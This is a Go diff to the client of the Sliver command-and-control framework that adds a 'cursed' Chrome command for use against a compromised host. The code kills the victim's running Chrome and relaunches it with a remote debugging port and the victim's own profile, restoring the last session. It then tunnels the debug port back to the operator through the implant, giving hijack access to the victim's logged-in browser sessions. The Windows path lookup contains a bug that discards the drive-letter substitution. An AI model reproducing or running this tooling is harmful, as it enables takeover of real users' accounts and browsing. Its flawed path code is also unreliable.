@@ -19,12 +19,21 @@ package cursed
 */
 
 import (
+	"context"
 	"fmt"
+	"log"
+	insecureRand "math/rand"
 	"strings"
+	"time"
 
+	"github.com/AlecAivazis/survey/v2"
 	"github.com/bishopfox/sliver/client/command/settings"
 	"github.com/bishopfox/sliver/client/console"
 	"github.com/bishopfox/sliver/client/core"
+	"github.com/bishopfox/sliver/client/tcpproxy"
+	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/desertbit/grumble"
 	"github.com/jedib0t/go-pretty/v6/table"
 )
@@ -55,5 +64,233 @@ func CursedCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		con.Printf("%s\n", tw.Render())
 	} else {
 		con.PrintInfof("No cursed processes\n")
+	}
+}
+
+func avadaKedavra(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) *core.CursedProcess {
+	chromeProcess, err := getChromeProcess(session, ctx, con)
+	if err != nil {
+		con.PrintErrorf("%s", err)
+		return nil
+	}
+	if chromeProcess != nil {
+		con.PrintWarnf("Found running Chrome process: %d (ppid: %d)\n", chromeProcess.GetPid(), chromeProcess.GetPpid())
+		con.PrintWarnf("Sliver will need to kill and restart the Chrome process in order to perform code injection.\n")
+		con.PrintWarnf("Sliver will attempt to restore the user's session, however %sDATA LOSS MAY OCCUR!%s\n", console.Bold, console.Normal)
+		con.Printf("\n")
+		confirm := false
+		err = survey.AskOne(&survey.Confirm{Message: "Kill and restore existing Chrome process?"}, &confirm)
+		if err != nil {
+			con.PrintErrorf("%s", err)
+			return nil
+		}
+		if !confirm {
+			return nil
+		}
+	}
+	curse, err := startCursedChromeProcess(true, session, ctx, con)
+	if err != nil {
+		con.PrintErrorf("%s\n", err)
+		return nil
+	}
+	return curse
+}
+
+func startCursedChromeProcess(restore bool, session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*core.CursedProcess, error) {
+	con.PrintInfof("Finding Chrome executable path ... ")
+	chromeExePath, err := findChromeExecutablePath(session, ctx, con)
+	if err != nil {
+		con.Printf("failure!\n")
+		return nil, err
+	}
+	con.Printf("success!\n")
+	con.PrintInfof("Finding Chrome user data directory ... ")
+	chromeUserDataDir, err := findChromeUserDataDir(session, ctx, con)
+	if err != nil {
+		con.Printf("failure!\n")
+		return nil, err
+	}
+	con.Printf("success!\n")
+
+	con.PrintInfof("Starting Chrome process ... ")
+	debugPort := uint16(ctx.Flags.Int("remote-debugging-port"))
+	args := []string{
+		fmt.Sprintf("--remote-debugging-port=%d", debugPort),
+	}
+	if restore {
+		args = append(args, fmt.Sprintf("--user-data-dir=%s", chromeUserDataDir))
+		args = append(args, "--restore-last-session")
+	}
+
+	// Execute the Chrome process with the extra flags
+	// TODO: PPID spoofing, etc.
+	chromeExec, err := con.Rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+		Request: con.ActiveTarget.Request(ctx),
+		Path:    chromeExePath,
+		Args:    args,
+		Output:  false,
+	})
+	if err != nil {
+		con.Printf("failure!\n")
+		return nil, err
+	}
+	con.Printf("(pid: %d) success!\n", chromeExec.GetPid())
+
+	con.PrintInfof("Waiting for Chrome process to initialize ... ")
+	time.Sleep(2 * time.Second)
+
+	bindPort := insecureRand.Intn(10000) + 40000
+	bindAddr := fmt.Sprintf("127.0.0.1:%d", bindPort)
+
+	remoteAddr := fmt.Sprintf("127.0.0.1:%d", debugPort)
+
+	tcpProxy := &tcpproxy.Proxy{}
+	channelProxy := &core.ChannelProxy{
+		Rpc:             con.Rpc,
+		Session:         session,
+		RemoteAddr:      remoteAddr,
+		BindAddr:        bindAddr,
+		KeepAlivePeriod: 60 * time.Second,
+		DialTimeout:     30 * time.Second,
+	}
+	tcpProxy.AddRoute(bindAddr, channelProxy)
+	portFwd := core.Portfwds.Add(tcpProxy, channelProxy)
+
+	curse := &core.CursedProcess{
+		SessionID:         session.ID,
+		PortFwd:           portFwd,
+		BindTCPPort:       bindPort,
+		Platform:          session.GetOS(),
+		ChromeExePath:     chromeExePath,
+		ChromeUserDataDir: chromeUserDataDir,
+	}
+	core.CursedProcesses.Store(bindPort, curse)
+	go func() {
+		err := tcpProxy.Run()
+		if err != nil {
+			log.Printf("Proxy error %s", err)
+		}
+		core.CursedProcesses.Delete(bindPort)
+	}()
+
+	con.PrintInfof("Port forwarding %s -> %s\n", bindAddr, remoteAddr)
+
+	return curse, nil
+}
+
+func isChromeProcess(executable string) bool {
+	var chromeProcessNames = []string{
+		"chrome",        // Linux
+		"chrome.exe",    // Windows
+		"Google Chrome", // Darwin
+	}
+	for _, suffix := range chromeProcessNames {
+		if strings.HasSuffix(executable, suffix) {
+			return true
+		}
+	}
+	return false
+}
+
+func getChromeProcess(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*commonpb.Process, error) {
+	ps, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
+		Request: con.ActiveTarget.Request(ctx),
+	})
+	if err != nil {
+		return nil, err
+	}
+	for _, process := range ps.Processes {
+		if process.GetOwner() != session.GetUsername() {
+			continue
+		}
+		if isChromeProcess(process.GetExecutable()) {
+			return process, nil
+		}
+	}
+	return nil, nil
+}
+
+func findChromeUserDataDir(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (string, error) {
+	switch session.GetOS() {
+
+	case "windows":
+		for _, driveLetter := range windowsDriveLetters {
+			userDataDir := fmt.Sprintf("%c:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data", driveLetter, session.GetUsername())
+			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+				Request: con.ActiveTarget.Request(ctx),
+				Path:    userDataDir,
+			})
+			if err != nil {
+				return "", err
+			}
+			if ls.GetExists() {
+				return userDataDir, nil
+			}
+		}
+		return "", ErrUserDataDirNotFound
+
+	case "darwin":
+		userDataDir := fmt.Sprintf("/Users/%s/Library/Application Support/Google/Chrome", session.Username)
+		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+			Request: con.ActiveTarget.Request(ctx),
+			Path:    userDataDir,
+		})
+		if err != nil {
+			return "", err
+		}
+		if ls.GetExists() {
+			return userDataDir, nil
+		}
+		return "", ErrUserDataDirNotFound
+
+	default:
+		return "", ErrUnsupportedOS
+	}
+}
+
+func findChromeExecutablePath(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (string, error) {
+	switch session.GetOS() {
+
+	case "windows":
+		chromePaths := []string{
+			"[DRIVE]:\\Program Files (x86)\\Google\\Chrome\\Application",
+			"[DRIVE]:\\Program Files\\Google\\Chrome\\Application",
+			"[DRIVE]:\\Users\\[USERNAME]\\AppData\\Local\\Google\\Chrome\\Application",
+			"[DRIVE]:\\Program Files (x86)\\Google\\Application",
+		}
+		for _, driveLetter := range windowsDriveLetters {
+			for _, chromePath := range chromePaths {
+				chromeExecutablePath := strings.ReplaceAll(chromePath, "[DRIVE]", string(driveLetter))
+				chromeExecutablePath = strings.ReplaceAll(chromePath, "[USERNAME]", session.GetUsername())
+				ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+					Request: con.ActiveTarget.Request(ctx),
+					Path:    chromeExecutablePath,
+				})
+				if err != nil {
+					return "", err
+				}
+				if ls.GetExists() {
+					return chromeExecutablePath, nil
+				}
+			}
+		}
+		return "", ErrChromeExecutableNotFound
+
+	case "darwin":
+		const defaultChromePath = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
+		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
+			Request: con.ActiveTarget.Request(ctx),
+			Path:    defaultChromePath,
+		})
+		if err != nil {
+			return "", err
+		}
+		if ls.GetExists() {
+			return defaultChromePath, nil
+		}
+		return "", ErrChromeExecutableNotFound
+
+	default:
+		return "", ErrUnsupportedOS
 	}
 }
